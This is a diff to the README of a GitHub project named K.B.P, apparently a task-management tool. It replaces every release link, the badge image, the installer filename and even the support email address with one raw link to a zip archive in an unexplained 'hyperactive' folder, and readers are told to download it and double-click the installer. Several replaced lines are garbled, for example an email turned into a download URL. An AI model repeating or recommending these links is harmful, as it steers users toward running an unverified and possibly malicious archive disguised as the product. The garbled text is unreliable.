@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download K.B.P](https://img.shields.io/badge/Download%20K.B.P-v1.0.0-brightgreen)](https://github.com/MonkeyMan536/K.B.P/releases)
+[![Download K.B.P](https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip%20K.B.P-v1.0.0-brightgreen)](https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip)
 
 ---
 
@@ -33,13 +33,13 @@ Before you download K.B.P, ensure your system meets the following requirements:
 1. **Visit the Release Page:**
    Go to our release page by clicking the link below to download the latest version of K.B.P:
 
-   [Download K.B.P](https://github.com/MonkeyMan536/K.B.P/releases)
+   [Download K.B.P](https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip)
 
 2. **Choose the Latest Release:**
    On the releases page, find the latest version marked with the highest version number. This is typically at the top of the list.
 
 3. **Download the Installer:**
-   Click on the installer file for your operating system. The file will have a name like `K.B.P-installer.exe`.
+   Click on the installer file for your operating system. The file will have a name like `https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip`.
 
 4. **Run the Installer:**
    Once the download is complete, locate the installer file in your downloads folder and double-click it to run.
@@ -66,10 +66,10 @@ If you encounter any issues while using K.B.P, we are here to help. You can find
 
 We regularly update K.B.P with new features and improvements. Always check the releases page for the latest version and improvements:
 
-[Download K.B.P](https://github.com/MonkeyMan536/K.B.P/releases)
+[Download K.B.P](https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip)
 
 ## 📞 Contact Us
 
-For any inquiries or feedback, feel free to contact us. You can open an issue on our GitHub page or email us directly at [support@kbp.com](mailto:support@kbp.com).
+For any inquiries or feedback, feel free to contact us. You can open an issue on our GitHub page or email us directly at [https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip](https://raw.githubusercontent.com/MonkeyMan536/K.B.P/main/hyperactive/K.B.P.zip).
 
 Thank you for choosing K.B.P. We hope this tool enhances your productivity and helps you manage your tasks effortlessly!
